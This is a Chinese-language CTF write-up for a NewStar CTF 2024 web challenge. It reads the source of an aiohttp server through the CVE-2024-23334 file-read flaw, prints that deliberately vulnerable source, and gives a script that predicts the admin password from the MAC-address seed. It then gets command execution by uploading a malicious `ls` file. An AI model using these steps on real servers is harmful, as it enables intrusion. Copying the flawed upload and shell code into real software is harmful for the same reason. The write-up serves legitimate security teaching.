---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# 臭皮的网站

<kbd>F12</kbd> 可以看到有一串 Base64 的字符串。

![网页源代码给出提示](/assets/images/wp/2024/week5/choupidewangzhan_1.png)

解码可以知道这个网站是 aiohttp 框架的，网上搜一搜相关的 CVE，了解到 CVE-2024-23334.

存在任意文件读取：

![任意文件读取读取源代码](/assets/images/wp/2024/week5/choupidewangzhan_2.png)

可以读取到源代码如下：

```python
import subprocess
from aiohttp import web
from aiohttp_session import setup as session_setup, get_session
from aiohttp_session.cookie_storage import EncryptedCookieStorage
import os
import uuid
import secrets
import random
import string
import base64
random.seed(uuid.getnode())
# pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp_session cryptography
# pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp==3.9.1


adminname = "admin"


def CreteKey():
    key_bytes = secrets.token_bytes(32)
    key_str = base64.urlsafe_b64encode(key_bytes).decode('ascii')
    return key_str


def authenticate(username, password):
    if username == adminname and password ==''.join(random.choices(string.ascii_letters + string.digits, k=8)):
        return True
    else:
        return False


async def middleware(app, handler):
    async def middleware_handler(request):
        try:
            response = await handler(request)
            response.headers['Server'] = 'nginx/114.5.14'
            return response
        except web.HTTPNotFound:
            response = await handler_404(request)
            response.headers['Server'] = 'nginx/114.5.14'
            return response
        except Exception:
            response = await handler_500(request)
            response.headers['Server'] = 'nginx/114.5.14'
            return response

    return middleware_handler


async def handler_404(request):
    return web.FileResponse('./template/404.html', status=404)


async def handler_500(request):
    return web.FileResponse('./template/500.html', status=500)


async def index(request):
    return web.FileResponse('./template/index.html')


async def login(request):
    data = await request.post()
    username = data['username']
    password = data['password']
    if authenticate(username, password):
        session = await get_session(request)
        session['user'] = 'admin'
        response = web.HTTPFound('/home')
        response.session = session
        return response
    else:
        return web.Response(text="账号或密码错误哦", status=200)


async def home(request):
    session = await get_session(request)
    user = session.get('user')
    if user == 'admin':
        return web.FileResponse('./template/home.html')
    else:
        return web.HTTPFound('/')


async def upload(request):
    session = await get_session(request)
    user = session.get('user')
    if user == 'admin':
        reader = await request.multipart()
        file = await reader.next()
        if file:
            filename = './static/' + file.filename
            with open(filename,'wb') as f:
                while True:
                    chunk = await file.read_chunk()
                    if not chunk:
                        break
                    f.write(chunk)
            return web.HTTPFound("/list")
        else:
            response = web.HTTPFound('/home')
            return response
    else:
        return web.HTTPFound('/')


async def ListFile(request):
    session = await get_session(request)
    user = session.get('user')
    command = "ls ./static"
    if user == 'admin':
        result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
        files_list = result.stdout
        return web.Response(text="static目录下存在文件\n"+files_list)
    else:
        return web.HTTPFound('/')


async def init_app():
    app = web.Application()
    app.router.add_static('/static/', './static', follow_symlinks=True)
    session_setup(app, EncryptedCookieStorage(secret_key=CreteKey()))
    app.middlewares.append(middleware)
    app.router.add_route('GET', '/', index)
    app.router.add_route('POST', '/', login)
    app.router.add_route('GET', '/home', home)
    app.router.add_route('POST', '/upload', upload)
    app.router.add_route('GET', '/list', ListFile)
    return app


web.run_app(init_app(), host='0.0.0.0', port=80)
```

这里 `admin` 密码使用了随机数，然而随机数的 `randseed` 设置如下，`random.seed(uuid.getnode())`.

这里种子是固定值，即 MAC 地址，我们可以通过文件读取获取这个种子。

![文件读取获得种子](/assets/images/wp/2024/week5/choupidewangzhan_3.png)

得到种子之后，可以预测 `rand` 的值。

```python
import random
import string
random.seed(0x0242ac11000f)
print(''.join(random.choices(string.ascii_letters + string.digits, k=8)))
```

要注意的是，这里的密码每一次调用比较，就会重新调用一次这个表达式，得到的值是不一样的，建议直接重启靶机之后做这个题目。

登陆上去可以上传文件。

![文件上传](/assets/images/wp/2024/week5/choupidewangzhan_4.png)

这里代码会把文件上传到 `static` 下，然后再 `/list` 路由下会调用 `ls`，可以看到自己 `/static` 下的文件。

但是这里存在任意文件上传，如果我们上传一个恶意的 `ls` 文件，然后访问 `ls`，触发这个恶意文件。

上传的 `ls` 文件内容如下：

![ls 文件内容](/assets/images/wp/2024/week5/choupidewangzhan_5.png)

这样访问 `list` 就会触发这个恶意的 `ls`.

![触发恶意的 ls](/assets/images/wp/2024/week5/choupidewangzhan_6.png)

得到 flag 名字，直接读取或者继续污染一次 `ls` 即可。
